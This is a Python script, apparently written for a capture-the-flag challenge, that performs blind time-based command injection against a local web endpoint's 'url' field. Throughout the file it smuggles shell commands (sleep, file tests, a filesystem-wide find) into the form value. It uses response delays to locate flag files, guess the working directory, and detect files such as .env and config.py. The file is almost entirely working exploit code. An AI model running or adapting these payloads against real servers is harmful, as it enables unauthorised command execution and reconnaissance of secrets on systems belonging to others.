import requests
import time

base_url = "http://127.0.0.1:32998/add_url"

print("[*] Starting Blind Command Injection Enumeration")
print(f"[*] Target: {base_url}")

def test_payload(payload, description):
    """Send payload and measure response time to detect time-based delays"""
    start_time = time.time()
    try:
        resp = requests.post(base_url, data={"url": payload}, timeout=15)
        elapsed = time.time() - start_time
        return elapsed, resp
    except requests.exceptions.Timeout:
        # Timeout means delay was very long - condition definitely true
        return 15, None
    except Exception as e:
        return -1, str(e)

# STEP 1: Confirm time-based detection works
print("\n[STEP 1] Confirming time-based detection mechanism")
payload = '"; sleep 2;"'
elapsed, resp = test_payload(payload, "sleep 2 test")
print(f"  Payload: {repr(payload)}")
print(f"  Response time: {elapsed:.2f}s")
if elapsed > 2.0:
    print("  [+] Time-based detection confirmed - delays are working!")
else:
    print("  [!] Time-based detection may not work properly")

# STEP 2: Test flag.txt at various locations
print("\n[STEP 2] Testing flag.txt existence at various locations")
print("="*60)

flag_locations = [
    "flag.txt",
    "./flag.txt",
    "../flag.txt",
    "/flag.txt",
    "/home/flag.txt",
    "/root/flag.txt",
    "/tmp/flag.txt",
    "/var/flag.txt",
    "/usr/flag.txt",
    "/opt/flag.txt",
    "/challenge/flag.txt",
    "/home/app/flag.txt",
    "/var/www/flag.txt",
    "/var/www/html/flag.txt"
]

found_flags = []

for loc in flag_locations:
    # Use [ -f path ] && sleep 3 - if file exists, delay 3 seconds
    payload = f'"; [ -f {loc} ] && sleep 3;"'
    elapsed, resp = test_payload(payload, f"Testing {loc}")
    
    print(f"\n  Location: {loc}")
    print(f"  Payload: {repr(payload)}")
    print(f"  Response time: {elapsed:.2f}s")
    
    if elapsed > 2.5:
        print(f"  [***] FOUND! flag.txt exists at: {loc}")
        found_flags.append(loc)
    else:
        print(f"  [-] Not found (or no access)")

print("\n" + "="*60)
print(f"[SUMMARY] Found {len(found_flags)} flag.txt locations:")
for f in found_flags:
    print(f"  -> {f}")

# STEP 3: Search for ANY file with 'flag' in name
if len(found_flags) == 0:
    print("\n[STEP 3] Searching for any file with 'flag' in name")
    print("="*60)
    
    # Use find command to locate flag files - head -1 gets first result
    payload = '"; found=$(find / -name \'*flag*\' -type f 2>/dev/null | head -1); [ -n \"$found\" ] && sleep 5;"'
    elapsed, resp = test_payload(payload, "Find any flag file")
    
    print(f"\n  Payload: {repr(payload)}")
    print(f"  Response time: {elapsed:.2f}s")
    
    if elapsed > 4.5:
        print("  [***] FOUND! At least one file with 'flag' in name exists!")
    else:
        print("  [-] No files with 'flag' in name found")

# STEP 4: Get current directory
print("\n[STEP 4] Determining current working directory")
print("="*60)

# Test common directories to find pwd
common_dirs = ["/app", "/var/www", "/var/www/html", "/home/app", "/challenge", "/opt", "/", "/tmp"]

for dir_path in common_dirs:
    payload = f'"; [ $(pwd) = \"{dir_path}\" ] && sleep 3;"'
    elapsed, resp = test_payload(payload, f"Check if pwd is {dir_path}")
    print(f"\n  Testing: pwd == {dir_path}")
    print(f"  Response time: {elapsed:.2f}s")
    
    if elapsed > 2.5:
        print(f"  [***] Current directory is: {dir_path}")
        break

# List files in current directory
print("\n[STEP 5] Listing files in current directory")
print("="*60)

# Try to find files using time-based enumeration
# Check for common files
common_files = ["app.py", "main.py", "server.py", "requirements.txt", "flag.txt", "secret.txt", "config.py", ".env"]

print("\n  Checking for common files in current directory:")
for filename in common_files:
    payload = f'"; [ -f {filename} ] && sleep 2;"'
    elapsed, resp = test_payload(payload, f"Check {filename}")
    
    if elapsed > 1.5:
        print(f"    [+] {filename} exists")
    else:
        print(f"    [-] {filename} not found")

# Check for directory existence
print("\n  Checking for directories:")
common_dirs_check = ["templates", "static", "uploads", "data", "config", "src"]

for dirname in common_dirs_check:
    payload = f'"; [ -d {dirname} ] && sleep 2;"'
    elapsed, resp = test_payload(payload, f"Check {dirname}")
    
    if elapsed > 1.5:
        print(f"    [+] Directory '{dirname}' exists")
    else:
        print(f"    [-] Directory '{dirname}' not found")

print("\n" + "="*60)
print("[*] Enumeration Complete")
print(f"[*] Confirmed flag.txt locations: {found_flags}")

